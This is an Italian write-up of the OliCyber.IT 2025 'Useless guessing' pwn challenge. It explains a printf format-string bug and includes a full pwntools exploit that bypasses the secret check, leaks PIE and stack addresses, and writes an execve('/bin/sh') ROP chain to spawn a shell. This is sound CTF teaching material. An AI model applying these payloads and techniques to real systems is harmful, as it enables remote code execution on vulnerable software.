# OliCyber.IT 2025 - Competizione nazionale

## [pwn] Useless guessing (1 solves)

Niente da dire... solo un'inutile app di guessing.

`nc uselessguessing.challs.olicyber.it 38071`

Author: Giulia Martino <@Giulia>

## Panoramica

La challenge è un (inutile) gioco di guessing:

1. Genera un secret composto da una sequenza di 32 byte randomici
2. Chiede all'utente di inserire il nome
3. Chiede all'utente di inserire il suo guess del secret
4. Logga l'evento
5. Se il guessing fallisce, esce
6. Altrimenti, chiede all'utente di inserire nuovamente il nome
7. Logga l'evento

Il binario è linkato staticamente e ha tutte le protezioni più comuni attive.

## Soluzione

La challenge contiene una vulnerabilità nella funzione `log_event`, nella quale viene chiamata la funzione `printf` con una format string controllata dall'utente: la challenge infatti concatena il nome, salvato in una variabile sullo stack, a delle stringhe hardcoded, e passa poi la stringa risultante come primo parametro ala funzione `printf`.

```c
void log_event(char *name, char *action) {
    char format[FORMAT_SZ];
    snprintf(format, sizeof(format), "[%%ld] %%s: %s\n", name);
    printf(format, time(NULL), action);
}
```

Inserendo nel nome format specifier (come `%s`, `%p`, `%d`, `%n`, ...) l'utente può leggere o scrivere memoria arbitraria.

La challenge non contiene una win function; un modo possibile di ottenere la flag è utilizzare l'arbitrary write per sovrascrivere un indirizzo di ritorno sullo stack e costruire una ROP chain che apre una shell chiamando la syscall `execve(/bin/sh address, 0x0, 0x0)`.

Per poterlo fare, però, abbiamo bisogno di un leak PIE in modo tale da calcolare l'indirizzo base del binario in memoria e poter costruire la ROP chain con gli indirizzi corretti. La funzione `log_event` viene chiamata dalla challenge due volte se il guess del segreto è corretto, il che ci suggerisce che potremmo utilizzare la prima chiamata alla `printf` per ottenere leak di indirizzi, e poi la seconda chiamata per scrivere arbitrariamente in memoria.

Inoltre, per poter accedere alla seconda chiamata a `printf` è necessario superare il controllo sul guess:

```c
    if (strncmp(secret, guess, SECRET_SZ) != 0)
        die("[-] Wrong secret");
```

La funzione `setup` inizializza il secret allocando un buffer sull'heap, utilizzando la funzione `malloc`, e ritorna un puntatore ad esso. Il valore di ritorno della funzione `setup` è salvato dalla funzione `chall` sullo stack.

Avendo un puntatore al secret sullo stack, è possibile utilizzare la format string vulnerability per leggere/scrivere a quell'indirizzo. La lettura leakerebbe il secret, ma sarebbe inutile perchè la challenge chiede il guess del secret **prima** di effettuare la prima chiamata alla `printf`.

È però possibile scrivere sul secret e bypassare il controllo effettuato con `strcmp`: utilizzando lo specifier `%x$n`, la funzione `printf` scrive al parametro all'offset `x` un numero intero, corrispondente al numero di byte che sono stati scritti dalla `printf` stessa fino a quel momento.

Nel caso della challenge, la prima chiamata a `printf` stampa una stringa formattata come sotto:

```text
Who are you?
Giulia
What is the secret?
Secret
[1748082356] Guess attempt: Giulia                      <-- Prima chiamata alla printf

[-] Wrong secret
```

dove la stringa name controllata è in questo caso `Giulia`. Ciò significa che quando la `printf` inizia a processare il nostro input controllato, il numero di caratteri già scritti fino a quel momento sarà uguale alla lunghezza di `[1748082356] Guess attempt: `, ovvero `0x1c`. Quindi, inserendo un format specifier del tipo `%x$n`, sostituendo `x` con l'offset corrispondente al puntatore alla stringa secret, la `printf` scriverà il numero `0x1c` come intero a 32 bit a quell'indirizzo (`0x0000001c`).

Sarà quindi sufficiente inserire la sequenza `\x1c\x00` all'inizio del guess del secret per passare il controllo di `strncmp`, che si ferma quando incontra null-byte.

A questo punto il check è bypassato, e si può utilizzare il resto dell'input del guess per leakare indirizzi dallo stack (e.g. con format specifier `%y$lx`, che stampa il blocco sullo stack corrispondente all'offset `y` in formato esadecimale a 64 bit). In particolare, leakiamo PIE e un indirizzo dello stack stesso.

### Trovare gli offset per la format string

È possibile utilizzare un debugger come GDB per trovare i valori degli offset di `printf` che corrispondono ai puntatori/valori che stiamo cercando. Il binario è a 64 bit, quindi i primi 6 parametri di `printf` sono passati tramite registri. Il primo parametro che viene cercato sullo stack è il settimo, che corrisponde all'offset 6 di `printf`. Mandando come input alla challenge una stringa come `%6$lx.%7$lx.%8$lx`, e confrontando l'output di `printf` con i valori sullo stack subito dopo la chiamata alla `printf`, è possibile trovare anche tutti gli altri offset necessari.

![stack_layout.png](writeup/stack_layout.png)

Inserendo quindi una stringa del tipo `%25$n%36$lx.%37$lx` come primo input alla challenge, è possibile sovrascrivere il secret per passare il controllo di `strncmp`, leakare PIE e leakare lo stack.

### ROP chain

A questo punto, è possibile utilizzare la seconda chiamata a `printf` per scrivere memoria arbitraria. La challenge, però, accetta in input soltanto un massimo di 32 caratteri, che non sono sufficienti per scrivere tutta la ROP chain utilizzando la format string in un solo colpo. Inoltre, la ROP chain conterrà sicuramente dei null byte, che interrompono il processing di `printf` della stringa del formato. Quindi, è necessario scrivere la ROP chain sullo stack in più stage.

Un modo possibile per farlo è utilizzare la seconda chiamata a `printf` per sovrascrivere l'indirizzo di ritorno sullo stack in modo tale che, alla fine dell'esecuzione di `chall`, l'esecuzione ritorni alla chiamata a `chall` stessa. In questo modo avremo a disposizione nuovamente due chiamate alla funzione `log_event`, e quindi anche alla funzione `printf`.

Avendo già leakato sia PIE sia stack, potremo organizzare il resto dell'exploit in questo modo:

1. usare la prima chiamata a `printf` per:

   - sovrascrivere nuovamente il secret per bypassare il controllo `strncmp`
   - utilizzare il resto del payload per scrivere sullo stack un pezzo di ROP chain, subito dopo all'indirizzo di ritorno di `chall` sullo stack

2a. se ci sono ancora byte di ROP chain da scrivere, usare la seconda chiamata a `printf` per sovrscrivere l'indirizzo di ritorno di `chall` sullo stack, per richiamare nuovamente `chall`, e poi ripetere dal punto 1

2b. altrimenti, utilizzare la seconda chiamata a `printf` per sovrascrivere l'indirizzo di ritorno di `chall` sullo stack, per ritornare al primo ROP chain gadget.

La ROP chain deve eseguire la syscall `execve(/bin/sh address, 0x0, 0x0)`, quindi i requisiti sono:

- scrivere la stringa `/bin/sh\x00` da qualche parte in memoria di cui si conosce l'indirizzo
- un gadget per settare `rdi = addr of /bin/sh\x00`
- un gadget per settare `rsi = 0x0`
- un gadget per settare `rdx = 0x0`
- un gadget per settare `rax = 0x3b`, ovvero il syscall number per `execve`
- un gadget `syscall`

Il binario è linkato staticamente, quindi contiene già tutti i gadget necessari. È possibile estrarli per esempio utilizzando `ropper`:

```bash
➜  ropper -f build/useless_guessing
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

Gadgets
=======

[...]
0x000000000000917f: pop rdi; ret;
[...]
0x00000000000111ee: pop rsi; ret;
[...]
0x0000000000021ec6: syscall; ret;
[...]
0x000000000008de8a: pop rax; pop rdx; pop rbx; ret;
[...]

```

Un paio di note:

- è possibile inserire la stringa `/bin/sh\x00` semplicemente come parte del guess del secret, subito dopo ai byte che permettono di bypassare il controllo di `strncmp`
- questa stringa è sullo stack, quindi il suo indirizzo è facilmente calcolabile dato che abbiamo già un leak di un indirizzo dello stack

### Arbitrary write

Dovendo chiamare `printf` diverse volte per scrivere la ROP chain sullo stack a pezzi, è comodo creare una funzione helper che generi automaticamente il payload. Nel payload di esempio sotto:

- supponiamo che l'offset dell'inizio del nostro input sia 26
- supponiamo che prima del nostro input la `printf` abbia già stampato `0x1c` caratteri

-> il risultato è che la `printf` scriverà `0x11337` come numero a 32bit all'indirizzo `0x4141414141414141`

```python
payload = f"%{0x11337 - 0x1c}c$28n".encode()            # 32 bit
payload += b"A" * (16 - len(payload))                   # Per allineare il blocco dell'indirizzo a 8 byte
payload += p64(0x4141414141414141)
```

Allo stesso modo, è possibile scrivere numeri a 16 o 8 bit utilizzando i payload sottostanti:

```python
payload = f"%{0x11337 - 0x1c}c$28hn".encode()           # 16 bit
payload += b"A" * (16 - len(payload))                   # Per allineare il blocco dell'indirizzo a 8 byte
payload += p64(0x4141414141414141)

payload = f"%{0x11337 - 0x1c}c$28hn".encode()           # 8 bit
payload += b"A" * (16 - len(payload))                   # Per allineare il blocco dell'indirizzo a 8 byte
payload += p64(0x4141414141414141)
```

È importante sottolineare che ogni payload scrive `solo` i bit specificati dal format specifier. Ciò significa che il secondo payload **non** scrive `0x11337`, ma `0x1337`, e il terzo scrive `0x37`.

Questo può essere sfruttato in quei casi in cui il numero che vogliamo scrivere è **minore** del numero di caratteri che sono già stati scritti dalla `printf` prima di processare il nostro input. Per esempio, se si volesse scrivere `0x0`, allora si potrebbe far scrivere dalla `printf` stessa il numero `0x100` come intero a 8 bit.

Da tenere in considerazione è che in generale, utilizzare la `printf` per scrivere direttamente numeri molto grossi in un colpo solo non è pratico: supponendo di voler scrivere il numero `0x13371337` in un'unica chiamata, si dovrebbe utilizzare un format specifier tipo `%322376475c$28n`. Ciò significa che la `printf` dovrebbe stampare in output più di `322 milioni` di caratteri prima di scrivere il valore desiderato nel puntatore all'offset `28`. Provare a scrivere numeri così grandi è sicuramente troppo lento e scomodo, e potrebbe anche far fallire direttamente la `printf`.

È quindi consigliato spezzare la scrittura a blocchi di 16 o 8 bit.

La funzione sottostante genera il payload per `printf` per scrivere un numero a 16 bit `what`, all'indirizzo `where`. Alcune note:

- l'offset del nostro input nella `printf` è sempre `26` (verificabile con GDB)
- il parametro `fix_secret` determina se è necessario prependere all'input il format specifier per scrivere sul secret e bypassare il controllo

```python
def fmt_write_16_payload(what, where, already_written, fix_secret=False):
    max_value = 2 ** 16 - 1
    assert what & max_value == what
    assert already_written & max_value == already_written   # Always true since already_written is either 0x1c or 0x1f
    printf_offset = 26

    if fix_secret:
        prefix = b"%25$n"
        expected_len = 24
        printf_offset += 1
    else:
        prefix = b""
        expected_len = 16

    part1 = f"%{max_value + 1 + what - already_written}c".encode()
    part2 = f"%{printf_offset + 2}$hn".encode()
    padding = b"A" * (expected_len - len(prefix) - len(part1) - len(part2))
    part3 = p64(where)
    payload = prefix + part1 + part2 + padding + part3
    return payload
```

A questo punto, è possibile mettere insieme tutti i pezzi e ottenere la flag.

## Exploit

```python
#!/usr/bin/env python3

import os
import logging
from pwn import *

logging.disable()

HOST = os.environ.get("HOST", "uselessguessing.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 38071))
exe_name = exe_name = os.path.join(os.path.dirname(__file__), "useless_guessing")
exe = context.binary = ELF(exe_name, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

gdbscript = f"""
b chall
continue
"""

def start():
    if args.GDB:
        io = gdb.debug(exe_name, gdbscript=gdbscript)
    elif args.LOCAL:
        io = process(exe_name)
    else:
        io = remote(HOST, PORT)
    return io

def fmt_write_16_payload(what, where, already_written, fix_secret=False):
    max_value = 2 ** 16 - 1
    assert what & max_value == what
    assert already_written & max_value == already_written   # Always true since already_written is either 0x1c or 0x1f
    printf_offset = 26

    # print(f"fmt_write_16_payload -> offs: {printf_offset}, what: {hex(what)}, where: {hex(where)}, already_written: {hex(already_written)}")

    if fix_secret:
        prefix = b"%25$n"
        expected_len = 24
        printf_offset += 1
    else:
        prefix = b""
        expected_len = 16

    part1 = f"%{max_value + 1 + what - already_written}c".encode()
    part2 = f"%{printf_offset + 2}$hn".encode()
    padding = b"A" * (expected_len - len(prefix) - len(part1) - len(part2))
    part3 = p64(where)
    payload = prefix + part1 + part2 + padding + part3
    return payload

# Repeat exploit until flag is found, there could be a newline somewhere breaking fgets
while True:

    io = start()

    # Leak stack and pie + overwrite secret
    io.sendafter(b"Who are you?", b"%25$n%36$lx.%37$lx")
    io.sendafter(b"What is the secret?", b"\x1c\x00")
    io.recvuntil(b"Guess attempt: ")
    stack_leak = io.recvuntil(b".", drop=True)
    stack_leak = int(stack_leak, 16)
    print(f"stack_leak: {hex(stack_leak)}")
    stack_ret = stack_leak - 0x8
    print(f"stack_ret: {hex(stack_ret)}")

    main_addr = io.recvline().strip()
    main_addr = int(main_addr, 16) - 24
    pie_base = main_addr - exe.symbols["main"]
    print(f"main_addr: {hex(main_addr)}")
    print(f"pie_base: {hex(pie_base)}")

    # Use format string to write return address LSB
    main_ret_bytes = (main_addr + 19) & 0xffff
    io.sendafter(b"Who are you?", fmt_write_16_payload(main_ret_bytes, stack_ret, 0x1f))

    def one_round(what, where):
        # Fix secret and write what at where
        io.sendafter(b"Who are you?", fmt_write_16_payload(what, where, 0x1c, fix_secret=True)[:-1])
        # Guess secret
        io.sendafter(b"What is the secret?", b"\x1c\x00")
        # Write ret address to re-call chall
        io.sendafter(b"Who are you?", fmt_write_16_payload(main_ret_bytes, stack_ret, 0x1f))

    # Write ROP chain
    POP_RAX_POP_RDX_POP_RBX = pie_base + 0x000000000008de8a
    POP_RDI = pie_base + 0x000000000000917f
    POP_RSI = pie_base + 0x00000000000111ee
    SYSCALL = pie_base + 0x0000000000021ec6
    GUESS_ADDR = stack_ret - 0x38

    ropchain = p64(GUESS_ADDR + 0x8)
    ropchain += p64(POP_RAX_POP_RDX_POP_RBX)
    ropchain += p64(0x3b)                       # rax = 0x3b (execve)
    ropchain += p64(0)                          # rdx = 0
    ropchain += p64(0)                          # rbx = 0
    ropchain += p64(POP_RSI)
    ropchain += p64(0)                          # rsi = 0
    ropchain += p64(SYSCALL)

    for i in range(0, len(ropchain), 2):
        what = u16(ropchain[i:i+2])
        where = stack_ret + 0x8 + i
        print(f"round: {i}, writing {hex(what)} at {hex(where)}")
        one_round(what, where)

    # Set return address to first rop gadget
    io.sendafter(b"Who are you?", b"%25$nAAA")
    guess = b"\x1c\x00AAAAAA/bin/sh\x00"
    io.sendafter(b"What is the secret?", guess)
    io.sendafter(b"Who are you?", fmt_write_16_payload(POP_RDI & 0xffff, stack_ret, 0x1f))

    if args.GDB:
        io.interactive()
        exit()

    io.sendline(b"cat flag")
    res = io.clean(1)
    io.close()

    if b"flag{" in res:
        flag = "flag{" + res.split(b"flag{")[1].split(b"}")[0].decode() + "}"
        print(flag)
        break

    print("exploit failed, retrying...")

```
